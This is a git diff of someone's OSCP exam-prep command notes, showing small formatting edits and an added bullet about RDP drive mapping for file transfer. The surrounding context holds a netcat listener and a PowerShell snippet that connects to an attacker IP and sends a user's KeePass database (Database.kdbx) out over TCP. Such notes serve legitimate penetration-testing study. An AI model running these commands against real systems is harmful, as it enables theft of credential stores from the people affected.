@@ -1,6 +1,6 @@
 # OSCP Commands
 
-**Preparing as part of my  OSCP Certificate.**
+**Preparing as part of my OSCP Certificate.**
 
 
 
@@ -440,6 +440,7 @@ nc -lvp 1234 > nmap
 ```
 - Powershell File transfer
 - Then if you have rdp you can add /drive:/tmp,tmp at the end of your command and it will map tmp on kali to tmp on client. Super easy to just drag and drop files.  Putting spoiler tags but don't really think file transfer techniques are spoilers.
+- RDP /drive:/tmp in file transfer
 - Check out discord link above message [Discord](https://discord.com/channels/780824470113615893/1087927556604432424/1278089984737411092), [GitHub](https://github.com/ashok5141/OSCP/blob/main/TransferFIles.MD)
 
 ```powershell
@@ -447,7 +448,7 @@ nc -lvp 1234 > nmap
 From Windows:   First start kali NC command
 $client = New-Object System.Net.Sockets.TcpClient("192.168.45.182", 1234) 
 $stream = $client.GetStream() 
-[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\jim\Documents\Database.kdbx") 
+[byte[]]$buffer = [System.IO.File]::ReadAllBytes("C:\Users\jim\Documents\Database.kdbx")  
 $stream.Write($buffer, 0, $buffer.Length) 
 $stream.Close() 
 $client.Close()
